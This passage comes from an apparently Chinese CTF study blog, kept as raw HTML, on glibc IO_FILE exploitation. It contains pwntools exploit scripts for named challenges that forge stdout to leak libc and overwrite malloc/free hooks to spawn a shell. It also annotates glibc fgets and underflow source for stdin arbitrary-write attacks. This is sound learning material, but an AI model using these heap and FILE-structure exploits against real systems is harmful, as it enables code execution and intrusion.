punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x101</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span>    <span class="token number">0x91</span><span class="token punctuation">,</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span>    <span class="token string">'\x90\x50'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span>    <span class="token number">0x71</span><span class="token punctuation">,</span>    <span class="token string">'\xdd\x25'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>fake_stdout <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>fake_stdoutadd<span class="token punctuation">(</span><span class="token number">0x59</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span>stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">132</span>leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">,</span>stdout_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span>    <span class="token number">0x71</span><span class="token punctuation">,</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span>    <span class="token number">0x71</span><span class="token punctuation">,</span>    malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>add<span class="token punctuation">(</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">11</span><span class="token punctuation">,</span>libc_base<span class="token operator">+</span>og<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>realloc_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'exit'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'Input the size:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>由于这题的idx没有判断正负,可以直接上溢到bss段的_IO_2_1_stdout_指针达到篡改的目的</p><h3 id="例题-roarctf-2019-realloc-magic-0"><a href="#例题-roarctf-2019-realloc-magic-0" class="headerlink" title="例题 roarctf_2019_realloc_magic 0"></a>例题 roarctf_2019_realloc_magic 0</h3><p>主要是学一下realloc函数的用法吧.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303011006285.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303011006406.png"></p><h3 id="TWCTF-online-2019-asterisk-alloc"><a href="#TWCTF-online-2019-asterisk-alloc" class="headerlink" title="TWCTF_online_2019_asterisk_alloc"></a>TWCTF_online_2019_asterisk_alloc</h3><p>glibc2.27,保护全开,可以无限realloc和各一次的malloc、colloc,不存在编辑功能,delete未清空指针.<br>realloc制造堆块重叠,常规劫持_IO_2_1_stdout.这里要注意一点,取出stdout时只能用malloc,若使用realloc时会在下次分配时free掉stdout,而stdout的nextsize通不过检查.</p><p>部分覆写的时候,b’\x60\x07’是不行的,估计跟固定偏移有关…</p><pre class=" language-python"><code class="language-python">realloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span>b<span class="token string">'\x60\xe7'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">131</span>leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">,</span>stdout_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span>free_hook_addr<span class="token number">-0x8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>realloc<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>b<span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>null<span class="token punctuation">(</span><span class="token punctuation">)</span>  io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="stdin任意读写"><a href="#stdin任意读写" class="headerlink" title="stdin任意读写"></a>stdin任意读写</h2><ul><li>设置 <code>_IO_read_end</code> 等于 <code>_IO_read_ptr</code></li><li>设置 <code>_flag &amp;~ _IO_NO_READS</code> 即 <code>_flag &amp;~ 0x4</code></li><li>设置 <code>_fileno</code> 为 0</li><li>设置 <code>_IO_buf_base</code> 为 <code>write_start</code> ， <code>_IO_buf_end</code> 为 <code>write_end</code> 且使得 <code>_IO_buf_end-_IO_buf_base</code> 大于fread要读的数据<br>以fgets函数为例</li></ul><h3 id="fgets源码分析"><a href="#fgets源码分析" class="headerlink" title="fgets源码分析"></a>fgets源码分析</h3><p>这是主要的调用流程<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303031227056.png"><br>关键函数在这里:</p><pre class=" language-c"><code class="language-c">_IO_size_t<span class="token function">_IO_getline_info</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">,</span> <span class="token keyword">int</span> delim<span class="token punctuation">,</span>          <span class="token keyword">int</span> extract_delim<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>eof<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>eof <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token operator">*</span>eof <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">_IO_fwide</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"判断输入缓冲区中是否有数据"</span>      _IO_ssize_t len <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">__uflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>eof<span class="token punctuation">)</span>        <span class="token operator">*</span>eof <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> delim<span class="token punctuation">)</span>        <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">_IO_sputbackc</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">++</span>len<span class="token punctuation">;</span>          <span class="token keyword">return</span> ptr <span class="token operator">-</span> buf<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>      n<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">char</span> <span class="token operator">*</span>t<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_size_t<span class="token punctuation">)</span> len <span class="token operator">>=</span> n<span class="token punctuation">)</span>        len <span class="token operator">=</span> n<span class="token punctuation">;</span>      t <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">memchr</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> delim<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          _IO_size_t old_len <span class="token operator">=</span> ptr<span class="token operator">-</span>buf<span class="token punctuation">;</span>          len <span class="token operator">=</span> t <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token operator">++</span>t<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token operator">++</span>len<span class="token punctuation">;</span>        <span class="token punctuation">}</span>          <span class="token function">memcpy</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>          fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> t<span class="token punctuation">;</span>          <span class="token keyword">return</span> old_len <span class="token operator">+</span> len<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token string">"将输入缓冲区的数据拷贝到目标缓冲区"</span>      <span class="token function">memcpy</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      n <span class="token operator">-</span><span class="token operator">=</span> len<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token keyword">return</span> ptr <span class="token operator">-</span> buf<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_getline_info<span class="token punctuation">)</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span><span class="token function">_IO_new_file_underflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">{</span>  _IO_ssize_t count<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">if</span> 0</span>  <span class="token comment" spellcheck="true">/* SysV does not make this test; take it out for compatibility */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_EOF_SEEN<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_READS<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token string">"判断输入缓冲区中是否有数据"</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>    <span class="token string">"判断输入缓冲区是否已经初始化,如果没有便进行初始化"</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* Maybe we already have a push back pointer.  */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_save_base <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">free</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_save_base<span class="token punctuation">)</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span>_IO_IN_BACKUP<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/* Flush all line buffered files before reading. */</span>  <span class="token comment" spellcheck="true">/* FIXME This can/should be moved to genops ?? */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF<span class="token operator">|</span>_IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">if</span> 0</span>      <span class="token function">_IO_flush_all_linebuffered</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">else</span></span>      <span class="token comment" spellcheck="true">/* We used to flush all line-buffered stream.  This really isn't     required by any standard.  My recollection is that     traditional Unix systems did this for stdout.  stderr better     not be line buffered.  So we do just that here     explicitly.  --drepper */</span>      <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_stdout<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINKED <span class="token operator">|</span> _IO_NO_WRITES <span class="token operator">|</span> _IO_LINE_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token operator">==</span> <span class="token punctuation">(</span>_IO_LINKED <span class="token operator">|</span> _IO_LINE_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>    <span class="token punctuation">}</span>  <span class="token function">_IO_switch_to_get_mode</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* This is very tricky. We have to adjust those     pointers before we call _IO_SYSREAD () since     we may longjump () out while waiting for     input. Those pointers may be screwed up. H.J. */</span>     <span class="token string">"初始化file结构的指针"</span>  fp<span class="token operator">-></span>_IO_read_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  fp<span class="token operator">-></span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_end    <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>    <span class="token string">"read系统调用,填满输入缓冲区"</span>  count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>               fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_EOF_SEEN<span class="token punctuation">;</span>      <span class="token keyword">else</span>    fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">,</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  fp<span class="token operator">-></span>_IO_read_end <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* If a stream is read to EOF, the calling application may switch active     handles.  As a result, our offset cache would no longer be valid, so     unset it.  */</span>      fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_offset <span class="token operator">!=</span> _IO_pos_BAD<span class="token punctuation">)</span>    <span class="token function">_IO_pos_adjust</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_offset<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_underflow<span class="token punctuation">,</span> _IO_file_underflow<span class="token punctuation">)</span></code></pre><h4 id="例题-ctfshow-Incomplete-Menu"><a href="#例题-ctfshow-Incomplete-Menu" class="headerlink" title="例题 ctfshow Incomplete Menu"></a>例题 ctfshow Incomplete Menu</h4><p>程序的edit存在一个任意地址写空字节的漏洞<br>利用mmap的堆地址与libc的固定偏移,修改_IO_2_1_stdout_的_IO_write_base和_IO_read_end的低字节使其相等,在puts函数时泄露libc地址.</p><p>第二步是stdin任意写:<br>先修改_IO_buf_base的低字节为0,此时其指向stdin.然后用如下方式构造相关指针</p><pre class=" language-python"><code class="language-python">io_list_all <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>fake_stdin <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token number">0xfbad208b</span><span class="token punctuation">,</span><span class="token 